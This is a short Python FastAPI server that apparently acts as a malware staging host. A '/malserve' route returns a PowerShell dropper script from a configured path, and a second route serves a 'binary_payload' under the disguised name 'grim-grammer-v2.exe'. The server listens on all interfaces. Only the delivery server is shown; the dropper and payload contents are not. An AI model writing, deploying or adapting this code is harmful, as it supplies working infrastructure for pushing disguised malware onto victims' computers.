from fastapi import FastAPI

from fastapi.responses import Response,FileResponse

import configparser

config = configparser.ConfigParser()
config.read("names.conf")


app = FastAPI()



@app.get("/malserve")
def malserve():
    with open(config["Paths"]["dropper"],"r",encoding="utf-8") as powershellscript:
        PSCode = powershellscript.read()
    return Response(
        content=PSCode,
        media_type="text/plain"
    )

@app.get("/bin/grim-grammer-v2.exe")
def serveBin():
    return FileResponse(
        config["Paths"]["binary_payload"]
    )
if __name__ == "__main__":
    import os
    from colorama import init
    init()
    os.system("uvicorn main:app --host 0.0.0.0 --port 3000 --reload")
